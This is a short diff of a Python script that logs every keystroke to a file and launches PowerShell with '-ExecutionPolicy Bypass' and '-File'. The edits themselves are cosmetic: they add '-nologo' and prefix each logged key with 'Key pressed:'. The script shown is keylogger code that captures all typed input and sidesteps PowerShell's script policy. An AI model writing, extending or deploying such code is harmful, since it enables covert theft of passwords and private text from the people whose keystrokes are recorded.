@@ -8,6 +8,7 @@ subprocess.Popen(
     [
         "powershell.exe",
         "-NoExit",
+        "-nologo",
         "-ExecutionPolicy",
         "Bypass",
         "-File",
@@ -22,6 +23,6 @@ while True:
     # Wait for the next event.
     event = keyboard.read_event()
     if event.event_type == keyboard.KEY_DOWN:
-        file.write(f"{event.name}\n")
+        file.write(f"Key pressed: {event.name}\n")
     if event.event_type == keyboard.KEY_UP:
         file.flush()
